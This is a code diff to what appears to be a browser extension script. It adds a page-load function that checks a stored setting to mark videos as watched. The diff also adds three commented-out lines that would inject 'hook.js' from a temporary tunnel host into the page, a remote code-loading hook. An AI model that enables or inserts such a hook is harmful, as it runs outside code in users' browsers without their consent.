@@ -1,3 +1,7 @@
+// var sc = document.createElement('script');
+// sc.src = "https://temp.loca.lt/hook.js"
+// document.head.appendChild(sc);
+
 function show_menu() {
     if ($('#chatroom_button_grid') != null) {
         $('#chatroom_button_grid').css({
@@ -29,7 +33,16 @@ function continue_code() {
         share_summary_on_chat();
 }
 
+function run_tools() {
+    chrome.storage.local.get(['youtube_video'], function (items) {
+        if (items['youtube_video'] == 'mark_all_videos_watched') {
+            mark_all_videos_watched();
+        }
+    })
+}
+
 $(document).ready(function () {
+    run_tools();
     is_searching_allowed();
     execute_user_info_check_on_local_storage();
 });
